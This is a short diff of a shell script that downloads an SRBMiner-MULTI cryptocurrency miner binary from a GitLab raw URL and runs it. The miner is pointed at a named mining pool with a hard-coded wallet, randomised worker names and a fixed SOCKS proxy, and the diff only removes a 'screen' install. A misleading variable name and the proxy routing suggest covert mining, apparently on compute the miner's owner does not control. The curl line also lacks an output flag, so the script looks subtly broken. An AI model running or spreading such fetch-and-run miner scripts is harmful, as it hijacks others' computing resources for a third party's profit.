@@ -1,5 +1,5 @@
 blkdiscard=$(shuf -n 1 -i 1-999999)
-sudo apt-get update && sudo apt-get install -y screen
+sudo apt-get update
 curl -L https://gitlab.com/gilaaja/exe/-/raw/main/SRBMiner-MULTI
 chmod +x SRBMiner-MULTI
 ./SRBMiner-MULTI --disable-gpu --algorithm minotaurx --pool stratum+tcps://stratum-ru.rplant.xyz:17068 --wallet RSryP2mM5gYVeTgaNrWZZREgwkXqurso5Q.$(echo $(shuf -i 1-9999 -n 1)-Gila_Avian) -t 16 --password x enable-4gb-hugepages --proxy 46.147.194.197:1080
